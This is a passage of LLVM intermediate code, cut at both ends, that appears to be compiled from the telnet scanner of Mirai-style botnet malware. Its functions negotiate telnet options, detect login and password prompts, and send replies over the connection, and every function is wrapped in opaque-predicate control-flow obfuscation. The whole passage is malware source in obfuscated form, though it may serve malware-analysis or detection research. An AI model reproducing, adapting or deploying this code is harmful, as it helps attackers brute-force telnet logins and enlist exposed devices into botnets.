originalBBpart216:                                ; preds = %originalBB14
  br label %229

; <label>:161:                                    ; preds = %61
  br label %162

; <label>:162:                                    ; preds = %161, %129
  %163 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %164 = load i8*, i8** %4, align 8
  %165 = call signext i8 @can_consume(%struct.scanner_connection* %163, i8* %164, i32 2)
  %166 = icmp ne i8 %165, 0
  br i1 %166, label %168, label %167

; <label>:167:                                    ; preds = %162
  br label %265

; <label>:168:                                    ; preds = %162
  store i32 0, i32* %5, align 4
  br label %169

; <label>:169:                                    ; preds = %216, %168
  %170 = load i32, i32* @x.65
  %171 = load i32, i32* @y.66
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %169
  %178 = load i32, i32* %5, align 4
  %179 = icmp slt i32 %178, 3
  %180 = load i32, i32* @x.65
  %181 = load i32, i32* @y.66
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %179, label %188, label %219

; <label>:188:                                    ; preds = %originalBBpart220
  %189 = load i8*, i8** %4, align 8
  %190 = load i32, i32* %5, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8, i8* %189, i64 %191
  %193 = load i8, i8* %192, align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 253
  br i1 %195, label %196, label %201

; <label>:196:                                    ; preds = %188
  %197 = load i8*, i8** %4, align 8
  %198 = load i32, i32* %5, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds i8, i8* %197, i64 %199
  store i8 -4, i8* %200, align 1
  br label %215

; <label>:201:                                    ; preds = %188
  %202 = load i8*, i8** %4, align 8
  %203 = load i32, i32* %5, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i8, i8* %202, i64 %204
  %206 = load i8, i8* %205, align 1
  %207 = zext i8 %206 to i32
  %208 = icmp eq i32 %207, 251
  br i1 %208, label %209, label %214

; <label>:209:                                    ; preds = %201
  %210 = load i8*, i8** %4, align 8
  %211 = load i32, i32* %5, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds i8, i8* %210, i64 %212
  store i8 -3, i8* %213, align 1
  br label %214

; <label>:214:                                    ; preds = %209, %201
  br label %215

; <label>:215:                                    ; preds = %214, %196
  br label %216

; <label>:216:                                    ; preds = %215
  %217 = load i32, i32* %5, align 4
  %218 = add nsw i32 %217, 1
  store i32 %218, i32* %5, align 4
  br label %169

; <label>:219:                                    ; preds = %originalBBpart220
  %220 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %221 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %220, i32 0, i32 1
  %222 = load i32, i32* %221, align 8
  %223 = load i8*, i8** %4, align 8
  %224 = call i64 @send(i32 %222, i8* %223, i64 3, i32 16384)
  %225 = load i8*, i8** %4, align 8
  %226 = getelementptr inbounds i8, i8* %225, i64 3
  store i8* %226, i8** %4, align 8
  %227 = load i32, i32* %3, align 4
  %228 = add nsw i32 %227, 3
  store i32 %228, i32* %3, align 4
  br label %229

; <label>:229:                                    ; preds = %219, %originalBBpart216
  br label %230

; <label>:230:                                    ; preds = %229
  br label %231

; <label>:231:                                    ; preds = %230, %39
  %232 = load i32, i32* @x.65
  %233 = load i32, i32* @y.66
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %231
  %240 = load i32, i32* @x.65
  %241 = load i32, i32* @y.66
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %248

; <label>:248:                                    ; preds = %originalBBpart224
  %249 = load i32, i32* @x.65
  %250 = load i32, i32* @y.66
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %248
  %257 = load i32, i32* @x.65
  %258 = load i32, i32* @y.66
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %11

; <label>:265:                                    ; preds = %167, %originalBBpart28, %49, %38, %originalBBpart2
  %266 = load i32, i32* %3, align 4
  ret i32 %266

originalBBalteredBB:                              ; preds = %originalBB, %11
  %267 = load i32, i32* %3, align 4
  %268 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %269 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %268, i32 0, i32 6
  %270 = load i32, i32* %269, align 4
  %271 = icmp slt i32 %267, %270
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %67
  %272 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %272, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %273 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %273, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %274 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %275 = load i8*, i8** %4, align 8
  %276 = call signext i8 @can_consume(%struct.scanner_connection* %274, i8* %275, i32 2)
  %277 = icmp ne i8 %276, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %90
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %107
  %278 = load i8*, i8** %4, align 8
  %279 = getelementptr inbounds i8, i8* %278, i64 2
  %280 = load i8, i8* %279, align 1
  %281 = zext i8 %280 to i32
  %282 = icmp ne i32 %281, 31
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %130
  %283 = load i8*, i8** %4, align 8
  %284 = getelementptr inbounds i8, i8* %283, i64 3
  store i8* %284, i8** %4, align 8
  %285 = load i32, i32* %3, align 4
  %_ = shl i32 %285, 3
  %286 = add nsw i32 %285, 3
  store i32 %286, i32* %3, align 4
  %287 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %288 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %287, i32 0, i32 1
  %289 = load i32, i32* %288, align 8
  %290 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %291 = call i64 @send(i32 %289, i8* %290, i64 3, i32 16384)
  %292 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %293 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %292, i32 0, i32 1
  %294 = load i32, i32* %293, align 8
  %295 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %296 = call i64 @send(i32 %294, i8* %295, i64 9, i32 16384)
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %169
  %297 = load i32, i32* %5, align 4
  %298 = icmp slt i32 %297, 3
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %231
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %248
  br label %originalBB26
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_user_prompt(%struct.scanner_connection*) #0 {
  %2 = load i32, i32* @x.67
  %3 = load i32, i32* @y.68
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca %struct.scanner_connection*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %11, align 8
  store i32 -1, i32* %14, align 4
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 6
  %21 = load i32, i32* %20, align 4
  %22 = sub nsw i32 %21, 1
  store i32 %22, i32* %13, align 4
  %23 = load i32, i32* @x.67
  %24 = load i32, i32* @y.68
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %31

; <label>:31:                                     ; preds = %originalBBpart213, %originalBBpart2
  %32 = load i32, i32* @x.67
  %33 = load i32, i32* @y.68
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB2, label %originalBB2alteredBB

originalBB2:                                      ; preds = %originalBB2alteredBB, %31
  %40 = load i32, i32* %13, align 4
  %41 = icmp sgt i32 %40, 0
  %42 = load i32, i32* @x.67
  %43 = load i32, i32* @y.68
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart24, label %originalBB2alteredBB

originalBBpart24:                                 ; preds = %originalBB2
  br i1 %41, label %50, label %134

; <label>:50:                                     ; preds = %originalBBpart24
  %51 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %52 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %51, i32 0, i32 7
  %53 = load i32, i32* %13, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [256 x i8], [256 x i8]* %52, i64 0, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = icmp eq i32 %57, 58
  br i1 %58, label %111, label %59

; <label>:59:                                     ; preds = %50
  %60 = load i32, i32* @x.67
  %61 = load i32, i32* @y.68
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %59
  %68 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %69 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %68, i32 0, i32 7
  %70 = load i32, i32* %13, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [256 x i8], [256 x i8]* %69, i64 0, i64 %71
  %73 = load i8, i8* %72, align 1
  %74 = sext i8 %73 to i32
  %75 = icmp eq i32 %74, 62
  %76 = load i32, i32* @x.67
  %77 = load i32, i32* @y.68
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %75, label %111, label %84

; <label>:84:                                     ; preds = %originalBBpart28
  %85 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %86 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %85, i32 0, i32 7
  %87 = load i32, i32* %13, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds [256 x i8], [256 x i8]* %86, i64 0, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = icmp eq i32 %91, 36
  br i1 %92, label %111, label %93

; <label>:93:                                     ; preds = %84
  %94 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %95 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %94, i32 0, i32 7
  %96 = load i32, i32* %13, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds [256 x i8], [256 x i8]* %95, i64 0, i64 %97
  %99 = load i8, i8* %98, align 1
  %100 = sext i8 %99 to i32
  %101 = icmp eq i32 %100, 35
  br i1 %101, label %111, label %102

; <label>:102:                                    ; preds = %93
  %103 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %104 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %103, i32 0, i32 7
  %105 = load i32, i32* %13, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds [256 x i8], [256 x i8]* %104, i64 0, i64 %106
  %108 = load i8, i8* %107, align 1
  %109 = sext i8 %108 to i32
  %110 = icmp eq i32 %109, 37
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %102, %93, %84, %originalBBpart28, %50
  %112 = load i32, i32* %13, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %14, align 4
  br label %134

; <label>:114:                                    ; preds = %102
  br label %115

; <label>:115:                                    ; preds = %114
  %116 = load i32, i32* @x.67
  %117 = load i32, i32* @y.68
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %115
  %124 = load i32, i32* %13, align 4
  %125 = add nsw i32 %124, -1
  store i32 %125, i32* %13, align 4
  %126 = load i32, i32* @x.67
  %127 = load i32, i32* @y.68
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart213, label %originalBB10alteredBB

originalBBpart213:                                ; preds = %originalBB10
  br label %31

; <label>:134:                                    ; preds = %111, %originalBBpart24
  %135 = load i32, i32* %14, align 4
  %136 = icmp eq i32 %135, -1
  br i1 %136, label %137, label %203

; <label>:137:                                    ; preds = %134
  call void @table_unlock_val(i8 zeroext 26)
  call void @table_unlock_val(i8 zeroext 27)
  %138 = call i8* @table_retrieve_val(i32 26, i32* %16)
  store i8* %138, i8** %17, align 8
  %139 = call i8* @table_retrieve_val(i32 27, i32* %16)
  store i8* %139, i8** %18, align 8
  %140 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %141 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %140, i32 0, i32 7
  %142 = getelementptr inbounds [256 x i8], [256 x i8]* %141, i32 0, i32 0
  %143 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %144 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %143, i32 0, i32 6
  %145 = load i32, i32* %144, align 4
  %146 = load i8*, i8** %17, align 8
  %147 = load i32, i32* %16, align 4
  %148 = sub nsw i32 %147, 1
  %149 = call i32 @util_memsearch(i8* %142, i32 %145, i8* %146, i32 %148)
  %150 = icmp ne i32 %149, -1
  %151 = zext i1 %150 to i32
  store i32 %151, i32* %15, align 4
  br i1 %150, label %152, label %154

; <label>:152:                                    ; preds = %137
  %153 = load i32, i32* %15, align 4
  store i32 %153, i32* %14, align 4
  br label %202

; <label>:154:                                    ; preds = %137
  %155 = load i32, i32* @x.67
  %156 = load i32, i32* @y.68
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %154
  %163 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %164 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %163, i32 0, i32 7
  %165 = getelementptr inbounds [256 x i8], [256 x i8]* %164, i32 0, i32 0
  %166 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %167 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %166, i32 0, i32 6
  %168 = load i32, i32* %167, align 4
  %169 = load i8*, i8** %18, align 8
  %170 = load i32, i32* %16, align 4
  %171 = sub nsw i32 %170, 1
  %172 = call i32 @util_memsearch(i8* %165, i32 %168, i8* %169, i32 %171)
  %173 = icmp ne i32 %172, -1
  %174 = zext i1 %173 to i32
  store i32 %174, i32* %15, align 4
  %175 = load i32, i32* @x.67
  %176 = load i32, i32* @y.68
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart223, label %originalBB15alteredBB

originalBBpart223:                                ; preds = %originalBB15
  br i1 %173, label %183, label %185

; <label>:183:                                    ; preds = %originalBBpart223
  %184 = load i32, i32* %15, align 4
  store i32 %184, i32* %14, align 4
  br label %185

; <label>:185:                                    ; preds = %183, %originalBBpart223
  %186 = load i32, i32* @x.67
  %187 = load i32, i32* @y.68
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %185
  %194 = load i32, i32* @x.67
  %195 = load i32, i32* @y.68
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %202

; <label>:202:                                    ; preds = %originalBBpart227, %152
  br label %203

; <label>:203:                                    ; preds = %202, %134
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %204 = load i32, i32* %14, align 4
  %205 = icmp eq i32 %204, -1
  br i1 %205, label %206, label %223

; <label>:206:                                    ; preds = %203
  %207 = load i32, i32* @x.67
  %208 = load i32, i32* @y.68
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %206
  store i32 0, i32* %10, align 4
  %215 = load i32, i32* @x.67
  %216 = load i32, i32* @y.68
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %225

; <label>:223:                                    ; preds = %203
  %224 = load i32, i32* %14, align 4
  store i32 %224, i32* %10, align 4
  br label %225

; <label>:225:                                    ; preds = %223, %originalBBpart231
  %226 = load i32, i32* %10, align 4
  ret i32 %226

originalBBalteredBB:                              ; preds = %originalBB, %1
  %227 = alloca i32, align 4
  %228 = alloca %struct.scanner_connection*, align 8
  %229 = alloca i8*, align 8
  %230 = alloca i32, align 4
  %231 = alloca i32, align 4
  %232 = alloca i32, align 4
  %233 = alloca i32, align 4
  %234 = alloca i8*, align 8
  %235 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %228, align 8
  store i32 -1, i32* %231, align 4
  %236 = load %struct.scanner_connection*, %struct.scanner_connection** %228, align 8
  %237 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %236, i32 0, i32 6
  %238 = load i32, i32* %237, align 4
  %_ = shl i32 %238, 1
  %_1 = shl i32 %238, 1
  %239 = sub nsw i32 %238, 1
  store i32 %239, i32* %230, align 4
  br label %originalBB

originalBB2alteredBB:                             ; preds = %originalBB2, %31
  %240 = load i32, i32* %13, align 4
  %241 = icmp sgt i32 %240, 0
  br label %originalBB2

originalBB6alteredBB:                             ; preds = %originalBB6, %59
  %242 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %243 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %242, i32 0, i32 7
  %244 = load i32, i32* %13, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds [256 x i8], [256 x i8]* %243, i64 0, i64 %245
  %247 = load i8, i8* %246, align 1
  %248 = sext i8 %247 to i32
  %249 = icmp eq i32 %248, 62
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %115
  %250 = load i32, i32* %13, align 4
  %_11 = shl i32 %250, -1
  %251 = add nsw i32 %250, -1
  store i32 %251, i32* %13, align 4
  br label %originalBB10

originalBB15alteredBB:                            ; preds = %originalBB15, %154
  %252 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %253 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %252, i32 0, i32 7
  %254 = getelementptr inbounds [256 x i8], [256 x i8]* %253, i32 0, i32 0
  %255 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %256 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %255, i32 0, i32 6
  %257 = load i32, i32* %256, align 4
  %258 = load i8*, i8** %18, align 8
  %259 = load i32, i32* %16, align 4
  %_16 = sub i32 0, %259
  %gen = add i32 %_16, 1
  %_17 = shl i32 %259, 1
  %_18 = sub i32 0, %259
  %gen19 = add i32 %_18, 1
  %_20 = sub i32 %259, 1
  %gen21 = mul i32 %_20, 1
  %260 = sub nsw i32 %259, 1
  %261 = call i32 @util_memsearch(i8* %254, i32 %257, i8* %258, i32 %260)
  %262 = icmp ne i32 %261, -1
  %263 = zext i1 %262 to i32
  store i32 %263, i32* %15, align 4
  br label %originalBB15

originalBB25alteredBB:                            ; preds = %originalBB25, %185
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %206
  store i32 0, i32* %10, align 4
  br label %originalBB29
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_pass_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 6
  %12 = load i32, i32* %11, align 4
  %13 = sub nsw i32 %12, 1
  store i32 %13, i32* %5, align 4
  br label %14

; <label>:14:                                     ; preds = %originalBBpart227, %1
  %15 = load i32, i32* %5, align 4
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %17, label %124

; <label>:17:                                     ; preds = %14
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 7
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [256 x i8], [256 x i8]* %19, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = sext i8 %23 to i32
  %25 = icmp eq i32 %24, 58
  br i1 %25, label %85, label %26

; <label>:26:                                     ; preds = %17
  %27 = load i32, i32* @x.69
  %28 = load i32, i32* @y.70
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %26
  %35 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %36 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %35, i32 0, i32 7
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [256 x i8], [256 x i8]* %36, i64 0, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = icmp eq i32 %41, 62
  %43 = load i32, i32* @x.69
  %44 = load i32, i32* @y.70
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %42, label %85, label %51

; <label>:51:                                     ; preds = %originalBBpart2
  %52 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %53 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %52, i32 0, i32 7
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [256 x i8], [256 x i8]* %53, i64 0, i64 %55
  %57 = load i8, i8* %56, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp eq i32 %58, 36
  br i1 %59, label %85, label %60

; <label>:60:                                     ; preds = %51
  %61 = load i32, i32* @x.69
  %62 = load i32, i32* @y.70
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %60
  %69 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %70 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %69, i32 0, i32 7
  %71 = load i32, i32* %5, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [256 x i8], [256 x i8]* %70, i64 0, i64 %72
  %74 = load i8, i8* %73, align 1
  %75 = sext i8 %74 to i32
  %76 = icmp eq i32 %75, 35
  %77 = load i32, i32* @x.69
  %78 = load i32, i32* @y.70
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %76, label %85, label %104

; <label>:85:                                     ; preds = %originalBBpart24, %51, %originalBBpart2, %17
  %86 = load i32, i32* @x.69
  %87 = load i32, i32* @y.70
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %85
  %94 = load i32, i32* %5, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %6, align 4
  %96 = load i32, i32* @x.69
  %97 = load i32, i32* @y.70
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %124

; <label>:104:                                    ; preds = %originalBBpart24
  br label %105

; <label>:105:                                    ; preds = %104
  %106 = load i32, i32* @x.69
  %107 = load i32, i32* @y.70
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %105
  %114 = load i32, i32* %5, align 4
  %115 = add nsw i32 %114, -1
  store i32 %115, i32* %5, align 4
  %116 = load i32, i32* @x.69
  %117 = load i32, i32* @y.70
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
